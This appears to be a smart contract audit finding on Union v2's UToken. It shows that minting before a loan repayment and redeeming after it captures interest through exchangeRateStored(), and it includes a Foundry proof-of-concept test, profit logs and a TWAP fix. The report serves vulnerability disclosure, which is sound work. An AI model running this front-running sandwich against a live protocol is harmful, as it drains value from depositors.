ozoooneth

medium

# The `exchangeRateStored()` function allows front-running on repayments

## Summary

The `exchangeRateStored()` function allows to perform front-running attacks when a repayment is being executed.  

## Vulnerability Detail

Since `_repayBorrowFresh()` increases `totalRedeemable` value which affects in the final exchange rate calculation used in functions such as `mint()` and `redeem()`, an attacker could perform a front-run to any repayment by minting `UTokens` beforehand, and redeem these tokens after the front-run repayment. In this situation, the attacker would always be obtaining profits since `totalRedeemable` value is increased after every repayment.

### Proof of Concept

```solidity
    function increaseTotalSupply(uint256 _amount) private {
        daiMock.mint(address(this), _amount);
        daiMock.approve(address(uToken), _amount);
        uToken.mint(_amount);
    }

    function testMintRedeemSandwich() public {
        increaseTotalSupply(50 ether);

        vm.prank(ALICE);
        uToken.borrow(ALICE, 50 ether);
        uint256 borrowed = uToken.borrowBalanceView(ALICE);

        vm.roll(block.number + 500);

        vm.startPrank(BOB);
        daiMock.approve(address(uToken), 100 ether);
        uToken.mint(100 ether);

        console.log("\n  [UToken] Total supply:", uToken.totalSupply());
        console.log("[UToken] BOB balance:", uToken.balanceOf(BOB));
        console.log("[DAI]    BOB balance:", daiMock.balanceOf(BOB));

        uint256 currExchangeRate = uToken.exchangeRateStored();
        console.log("[1] Exchange rate:", currExchangeRate);
        vm.stopPrank();

        vm.startPrank(ALICE);
        uint256 interest = uToken.calculatingInterest(ALICE);
        uint256 repayAmount = borrowed + interest;

        daiMock.approve(address(uToken), repayAmount);
        uToken.repayBorrow(ALICE, repayAmount);

        console.log("\n  [UToken] Total supply:", uToken.totalSupply());
        console.log("[UToken] ALICE balance:", uToken.balanceOf(ALICE));
        console.log("[DAI]    ALICE balance:", daiMock.balanceOf(ALICE));

        currExchangeRate = uToken.exchangeRateStored();
        console.log("[2] Exchange rate:", currExchangeRate);
        vm.stopPrank();

        vm.startPrank(BOB);
        uToken.redeem(uToken.balanceOf(BOB), 0);

        console.log("\n  [UToken] Total supply:", uToken.totalSupply());
        console.log("[UToken] BOB balance:", uToken.balanceOf(BOB));
        console.log("[DAI]    BOB balance:", daiMock.balanceOf(BOB));

        currExchangeRate = uToken.exchangeRateStored();
        console.log("[3] Exchange rate:", currExchangeRate);
    }
```

### Result

```bash
[PASS] testMintRedeemSandwich() (gas: 560119)
Logs:

  [UToken] Total supply: 150000000000000000000
  [UToken] BOB balance: 100000000000000000000
  [DAI]    BOB balance: 0
  [1] Exchange rate: 1000000000000000000

  [UToken] Total supply: 150000000000000000000
  [UToken] ALICE balance: 0
  [DAI]    ALICE balance: 99474750000000000000
  [2] Exchange rate: 1000084166666666666

  [UToken] Total supply: 50000000000000000000
  [UToken] BOB balance: 0
  [DAI]    BOB balance: 100008416666666666600
  [3] Exchange rate: 1000084166666666668
```

## Impact

An attacker could always get profits from front-running repayments by taking advantage of `exchangeRateStored()` calculation before a repayment is made.

## Code Snippet

[exchangeRateStored()](https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/market/UToken.sol#L467-L470)

```solidity
function exchangeRateStored() public view returns (uint256) {
    uint256 totalSupply_ = totalSupply();
    return totalSupply_ == 0 ? initialExchangeRateMantissa : (totalRedeemable * WAD) / totalSupply_;
}
```

[_repayBorrowFresh()](https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/market/UToken.sol#L657)

```solidity
function _repayBorrowFresh(address payer, address borrower, uint256 amount, uint256 interest) internal {
    if (getBlockNumber() != accrualBlockNumber) revert AccrueBlockParity();
    uint256 borrowedAmount = borrowBalanceStoredInternal(borrower);
    uint256 repayAmount = amount > borrowedAmount ? borrowedAmount : amount;
    if (repayAmount == 0) revert AmountZero();

    uint256 toReserveAmount;
    uint256 toRedeemableAmount;

    if (repayAmount >= interest) {
        // If the repayment amount is greater than the interest (min payment)
        bool isOverdue = checkIsOverdue(borrower);

        // Interest is split between the reserves and the uToken minters based on
        // the reserveFactorMantissa When set to WAD all the interest is paid to teh reserves.
        // any interest that isn't sent to the reserves is added to the redeemable amount
        // and can be redeemed by uToken minters.
        toReserveAmount = (interest * reserveFactorMantissa) / WAD;
        toRedeemableAmount = interest - toReserveAmount;

        // Update the total borrows to reduce by the amount of principal that has
        // been paid off
        totalBorrows -= (repayAmount - interest);

        // Update the account borrows to reflect the repayment
        accountBorrows[borrower].principal = borrowedAmount - repayAmount;
        accountBorrows[borrower].interest = 0;

        // Call update locked on the userManager to lock this borrowers stakers. This function
        // will revert if the account does not have enough vouchers to cover the repay amount. ie
        // the borrower is trying to repay more than is locked (owed)
        IUserManager(userManager).updateLocked(borrower, (repayAmount - interest).toUint96(), false);

        if (isOverdue) {
            // For borrowers that are paying back overdue balances we need to update their
            // frozen balance and the global total frozen balance on the UserManager
            IUserManager(userManager).onRepayBorrow(borrower);
        }

        if (getBorrowed(borrower) == 0) {
            // If the principal is now 0 we can reset the last repaid block to 0.
            // which indicates that the borrower has no outstanding loans.
            accountBorrows[borrower].lastRepay = 0;
        } else {
            // Save the current block number as last repaid
            accountBorrows[borrower].lastRepay = getBlockNumber();
        }
    } else {
        // For repayments that don't pay off the minimum we just need to adjust the
        // global balances and reduce the amount of interest accrued for the borrower
        toReserveAmount = (repayAmount * reserveFactorMantissa) / WAD;
        toRedeemableAmount = repayAmount - toReserveAmount;
        accountBorrows[borrower].interest = interest - repayAmount;
    }

    totalReserves += toReserveAmount;
    totalRedeemable += toRedeemableAmount;

    accountBorrows[borrower].interestIndex = borrowIndex;

    // Transfer underlying token that have been repaid and then deposit
    // then in the asset manager so they can be distributed between the
    // underlying money markets
    IERC20Upgradeable(underlying).safeTransferFrom(payer, address(this), repayAmount);
    _depositToAssetManager(repayAmount);

    emit LogRepay(payer, borrower, repayAmount);
}
```

[Usage in `mint()` function](https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/market/UToken.sol#L714)

[Usage in `redeem()` function](https://github.com/sherlock-audit/2023-02-union/blob/main/union-v2-contracts/contracts/market/UToken.sol#L742)

## Tool used

Manual Review

## Recommendation

An approach could be implementing TWAP in order to make front-running unprofitable in this situation.